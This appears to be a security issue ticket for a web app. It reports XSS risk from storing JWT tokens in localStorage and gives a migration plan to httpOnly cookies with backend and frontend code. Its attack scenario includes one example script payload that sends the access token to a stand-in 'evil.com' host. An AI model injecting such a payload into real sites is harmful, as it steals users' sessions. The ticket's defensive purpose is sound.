# Security: JWT Token XSS Vulnerability (localStorage Storage)

## Priority

🟠 **HIGH** - Security vulnerability

## Description

JWT tokens are stored in browser localStorage, making them vulnerable to Cross-Site Scripting (XSS) attacks. If an XSS vulnerability exists anywhere in the application, attackers can steal authentication tokens and impersonate users.

## Security Risk

-   **Impact**: High - Complete account takeover possible
-   **Likelihood**: Medium - Requires XSS vulnerability to exploit
-   **CVSS**: High (7.0+)

## Current Implementation Issues

### Token Storage in localStorage

**File**: `frontend/src/pages/Login.jsx:46`

```javascript
localStorage.setItem("access_token", response.data.access_token);
localStorage.setItem("refresh_token", response.data.refresh_token);
```

**File**: `frontend/src/api.js:23`

```javascript
const token = localStorage.getItem("access_token");
if (token) {
    config.headers.Authorization = `Bearer ${token}`;
}
```

### Token Cleanup on Logout

**File**: `frontend/src/api.js:47`

```javascript
localStorage.removeItem("access_token");
localStorage.removeItem("refresh_token");
```

## Attack Scenario

1. Attacker finds XSS vulnerability (e.g., unescaped user input display)
2. Injects malicious script: `<script>fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))</script>`
3. Script executes and steals tokens
4. Attacker uses tokens to impersonate user

## Current XSS Risk Points

Based on audit findings, potential XSS vectors:

-   **Transaction names/notes**: User input displayed without sanitization
-   **Console logging**: Error objects with user data logged to browser console
-   **Import functionality**: CSV parsing and display

## Solution Options

### Option 1: httpOnly Cookies (Recommended)

```javascript
// Backend sets httpOnly cookie
response.set_cookie(
    "access_token",
    token,
    (httponly = True),
    (secure = True),
    (samesite = "Strict")
);

// Frontend - automatic inclusion, no JS access
// No localStorage needed
```

### Option 2: Short-lived Tokens + Refresh Rotation

```javascript
// Shorter access token lifetime (5-15 minutes)
// Automatic refresh with rotation
// Still vulnerable but limited exposure window
```

### Option 3: Memory Storage + Session Duration

```javascript
// Store in component state/context only
// Lost on page refresh - trade-off for security
```

## Recommended Implementation (httpOnly Cookies)

### Backend Changes

```python
# backend/routes/auth.py - Login endpoint
@auth_bp.route("/login", methods=["POST"])
def login():
    # ... existing validation ...

    access_token = create_access_token(identity=str(user.id))
    refresh_token = create_refresh_token(identity=str(user.id))

    response = make_response(jsonify({
        "user": {"id": user.id, "email": user.email},
        "message": "Login successful"
    }))

    # Set httpOnly cookies
    response.set_cookie(
        'access_token',
        access_token,
        max_age=timedelta(hours=24),
        httponly=True,
        secure=True if not app.debug else False,
        samesite='Strict'
    )

    response.set_cookie(
        'refresh_token',
        refresh_token,
        max_age=timedelta(days=30),
        httponly=True,
        secure=True if not app.debug else False,
        samesite='Strict'
    )

    return response
```

### Frontend Changes

```javascript
// Remove localStorage operations
// Cookies automatically sent with requests

// api.js - Update interceptor
api.interceptors.request.use((config) => {
    // Remove token header setting - cookies handle this
    // config.headers.Authorization = `Bearer ${token}`;  // Remove this
    return config;
});

// Handle authentication state differently
const [isAuthenticated, setIsAuthenticated] = useState(null); // null = checking
```

### JWT Configuration

```python
# backend/app.py - Configure JWT for cookies
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['JWT_ACCESS_COOKIE_PATH'] = '/'
app.config['JWT_REFRESH_COOKIE_PATH'] = '/'
app.config['JWT_COOKIE_CSRF_PROTECT'] = True  # Additional CSRF protection
```

## Implementation Steps

1. **Backend**: Update auth endpoints to set httpOnly cookies
2. **Frontend**: Remove localStorage operations, update auth state management
3. **JWT Config**: Configure Flask-JWT-Extended for cookie support
4. **Testing**: Verify auth flow works with cookies
5. **CORS**: Update CORS to support credentials
6. **Documentation**: Update auth flow documentation

## Migration Strategy

1. **Phase 1**: Implement parallel cookie support alongside localStorage
2. **Phase 2**: Update frontend to use cookies
3. **Phase 3**: Remove localStorage fallback
4. **Phase 4**: Remove localStorage cleanup

## Files to Modify

-   `backend/routes/auth.py` - Cookie-based login/logout
-   `backend/app.py` - JWT cookie configuration
-   `frontend/src/api.js` - Remove localStorage token handling
-   `frontend/src/pages/Login.jsx` - Remove localStorage operations
-   `frontend/src/App.jsx` - Update auth state management
-   `docs/SECURITY.md` - Document new auth flow

## Testing Requirements

-   [ ] Login sets httpOnly cookies correctly
-   [ ] Authenticated requests work without localStorage
-   [ ] Logout clears cookies
-   [ ] Refresh token rotation works with cookies
-   [ ] CORS works with credentials
-   [ ] Mobile/PWA functionality maintained

## Related Issues

-   Input sanitization for XSS prevention (#XX)
-   CSRF protection enhancement (#XX)

## Labels

`security`, `high`, `frontend`, `backend`, `authentication`, `xss-prevention`
